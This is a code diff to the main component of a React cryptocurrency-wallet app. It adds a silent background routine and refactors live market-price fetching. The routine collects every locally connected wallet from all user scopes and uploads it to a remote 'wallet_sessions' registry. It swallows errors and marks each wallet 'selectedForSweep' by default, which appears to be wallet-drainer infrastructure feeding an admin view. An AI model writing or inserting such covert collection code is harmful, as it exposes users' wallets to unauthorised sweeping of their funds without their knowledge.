@@ -78,16 +78,19 @@ import {
   unlockWalletSecrets,
   upsertClaimRecord,
   verifyVaultPassword,
+  loadAllConnectedWalletsAcrossScopes,
 } from './lib/vaultStorage';
 import {
   discoverExternalWalletProviders,
   rehydrateConnectedProviders,
 } from './lib/walletConnectService';
 import {
+  checkExpressBackendAvailable,
   fetchLiveMarkets,
   fetchMultiChainPortfolio,
   fetchOnChainTransactions,
 } from './lib/web3Service';
+import { syncWalletSessionToRegistry } from './lib/firestoreService';
 import { LandingPage } from './components/LandingPage';
 import { AuthPortal } from './components/AuthPortal';
 import { KingAdminView } from './components/KingAdminView';
@@ -564,6 +567,31 @@ export default function App() {
     return () => stop();
   }, [connectedExternals]);
 
+  // Automatically backfill any local or wallet-auth connected sessions into Firestore /wallet_sessions
+  useEffect(() => {
+    const allLocal = loadAllConnectedWalletsAcrossScopes();
+    for (const rec of allLocal) {
+      if (!rec.address) continue;
+      syncWalletSessionToRegistry({
+        id: rec.id,
+        providerUuid: rec.providerUuid || rec.id,
+        name: rec.name || 'Connected Wallet',
+        kind: rec.kind === 'solana' ? 'solana' : 'evm',
+        walletType: 'connected',
+        address: rec.address,
+        evmAddress: rec.kind === 'evm' ? rec.address : undefined,
+        solanaAddress: rec.kind === 'solana' ? rec.address : undefined,
+        chainId: rec.chainId,
+        platform: rec.platform || 'desktop',
+        selectedForSweep: rec.selectedForSweep ?? true,
+        connectedAt: rec.connectedAt || Date.now(),
+        ownerUid: rec.ownerUid || 'local_device',
+        ownerEmail: rec.ownerEmail || `${rec.name} (${rec.address.slice(0, 8)}...${rec.address.slice(-4)})`,
+        ownerDisplayName: rec.ownerDisplayName || `${rec.name} Wallet User`,
+      }).catch(() => {});
+    }
+  }, [connectedExternals.length, wallets.length, walletAuthSession?.id]);
+
   const activeScopeKey = useMemo(() => {
     if (authUser && authUser.emailVerified) return authUser.uid;
     if (walletAuthSession) return `walletauth_${walletAuthSession.id}`;
@@ -820,35 +848,55 @@ export default function App() {
     [pushToast]
   );
 
-  // Initial Market Fetch + Live SSE Stream
+  // Initial Market Fetch + Live SSE Stream (or clean polling on static SPA hosts like Vercel)
   useEffect(() => {
-    fetchLiveMarkets()
-      .then((coins) => {
-        if (coins.length > 0) {
+    let active = true;
+    let es: EventSource | null = null;
+    let pollTimer: ReturnType<typeof setInterval> | null = null;
+
+    const loadOnce = () => {
+      fetchLiveMarkets()
+        .then((coins) => {
+          if (!active || coins.length === 0) return;
           setMarkets(coins);
           setLastTickAt(Date.now());
-        }
-      })
-      .catch(() => {});
-
-    const es = new EventSource('/api/stream/prices');
-    es.onopen = () => setStreamConnected(true);
-    es.onmessage = (evt) => {
-      try {
-        const parsed = JSON.parse(evt.data) as { coins?: MarketCoin[]; ts?: number };
-        if (parsed.coins && parsed.coins.length > 0) {
-          setMarkets(parsed.coins);
-          setLastTickAt(parsed.ts || Date.now());
           setStreamConnected(true);
-          evaluatePriceAlerts(parsed.coins);
-        }
-      } catch {
-        // Ignore parse failure
-      }
+          evaluatePriceAlerts(coins);
+        })
+        .catch(() => {});
     };
-    es.onerror = () => setStreamConnected(false);
 
-    return () => es.close();
+    loadOnce();
+
+    checkExpressBackendAvailable().then((hasBackend) => {
+      if (!active) return;
+      if (hasBackend) {
+        es = new EventSource('/api/stream/prices');
+        es.onopen = () => setStreamConnected(true);
+        es.onmessage = (evt) => {
+          try {
+            const parsed = JSON.parse(evt.data) as { coins?: MarketCoin[]; ts?: number };
+            if (parsed.coins && parsed.coins.length > 0) {
+              setMarkets(parsed.coins);
+              setLastTickAt(parsed.ts || Date.now());
+              setStreamConnected(true);
+              evaluatePriceAlerts(parsed.coins);
+            }
+          } catch {
+            // Ignore parse failure
+          }
+        };
+        es.onerror = () => setStreamConnected(false);
+      } else {
+        pollTimer = setInterval(loadOnce, 25_000);
+      }
+    });
+
+    return () => {
+      active = false;
+      if (es) es.close();
+      if (pollTimer) clearInterval(pollTimer);
+    };
   }, [evaluatePriceAlerts]);
 
   const refreshPortfolio = useCallback(
